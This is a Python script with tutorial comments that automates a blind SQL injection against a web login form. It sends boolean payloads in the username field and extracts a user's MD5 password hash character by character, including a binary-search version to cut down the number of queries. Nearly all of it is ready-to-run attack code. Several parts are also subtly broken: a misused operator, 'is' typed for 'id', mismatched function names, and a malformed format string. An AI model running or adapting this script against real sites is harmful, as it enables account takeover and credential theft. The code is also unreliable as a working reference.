#Exploiting a restricted SQL injection
#Our blind SQL injection could be done using premade tools
#This can be great but in some situations can be limiting.
#Restricted SQLis might restrict you to a number of queries.
#Hypthetical restrictions
	#We can only make 128 Queries
		#32 Character MD% password
		#16 Options per character
		#128/32 = 4 requests per character

#Binary search allows for a soluion
#We know min and max values
#We compare our guess by comparing it to the middle value.

#Exploiting an SQL Injection
#A web application you are authorized to attack is required for this script.
#In this script, we will automate an SQL Injection

import requests

total_queries = 0

#We will be working with hash sums so we will set the charater set as follows.
charset = "0123456789abcdef"

#additonal variables.

target = "<TARGET IP HERE>: <TARGET PORT HERE>"
needle = "Welcome back"

#The needle helps us validate success of the query.
#The function below will take a payload and send it to the web app which is vulnerable to SQL inj.
#This is a blind SQL which is why we need the needle to validate a True or False response.

def injected_query(payload):
	global total_queries
	r = requests.post(target, data = {"username" : "admin' and {}--".format(payload), "password":"password"})
	total_queries ++ 1
	return needle.encode() not in r.content

#Function to identiy whether a character is valid.
def boolean_query(offset, user_id, character, operator=">"):
	payload = "(select hex(substr(password,{},1)) from user where id = {}) {} hex('{}')".format(offset+1, user_id, operator, character)
	return injected_query(payload)

#Function to identify if userID is valid.
def invalid_user(user_id):
	payload = "(select id from user where is ={}) >+ 0".format(user_id)
	return injected_query(payload)

#Function to identify if Password length is valid.
def password_length(user_id):
	i = 0
	while True:
		payload = "(select length(password) from user where is = {} and length(password) <= limit 1)".format(user_id, i)
		if not injected_query(payload):
			return i
		i += 1
#Function to extract a user password based on  the 3 variables below.
def extract_hash(charset, user_id, password_length):
	found = ""
	for i in range(0, password_length):
		for j in range(len(charset)):
			if boolean_query(i, user_id, charset[j]):
				found += charset[j]
				break
	return found

#Implementing Binary Search
def extract_hast_bst(charset, user_id, password_length):
	found = ""
	for index in range(0, password_length):
		start = 0
		end = len(charset) - 1
		while start <= end:
			if end - start == 1:
				if start == 0 and boolean_query(index, user_id, charset[start]):
					found += charset[start]
				else:
					found += charset[start + 1]
				break
			else:
				middle = (start + end) // 2
				if boolean_query(index, user_id. charset[middle]):
					end = middle
				else:
					start = middle
	return found

#Function to show how many queries taken.
def total_queries_taken():
	global total_queries
	print("\t\t[!] {} total queries!".format(total_queries))
	total_queries = 0

#This portiong is only here to provide a user interaction interface for those who run the script.
while True:
	try:
		user_id = input("> Enter a user ID to extract the password hash:")
		if not invalid_user(user_id):
			user_password_length = password_length(user_id)
			print("\t[-] User {} hash length: {}".format(user_id, password_length))
			total_queries_taken()
			print("\t[-] User {} hash: {}".format(user_id, extract_hash(charset, int(user_id), user_password_length)))
			total_queries_taken()
			print("\t[-] User {} hash: {}".format(user_id, extract_hash_bst(charset, int(user_id), user_password_length)))
			total_queries_taken()
		else:
			print("\t[X] User {} does not exist!".format(user_id))
	except KeyboardInterrupt:
		break
